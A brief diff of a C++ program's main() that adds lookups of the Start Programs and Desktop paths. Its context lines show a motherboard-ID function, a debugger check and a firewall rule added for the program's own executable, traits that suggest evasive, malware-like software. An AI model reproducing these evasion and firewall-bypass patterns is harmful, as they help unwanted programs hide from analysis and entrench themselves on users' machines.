@@ -294,6 +294,9 @@ std::string GetMotherboardID() {
 }
 int main() {
 
+	auto sssss = Path::StartPrograms();
+	auto sssss2 = Path::UserDesktop();
+
 	bool bind = WinTool::CheckDebug();
 
 	WinTool::AddFirewallRule(Path::StartFileName());
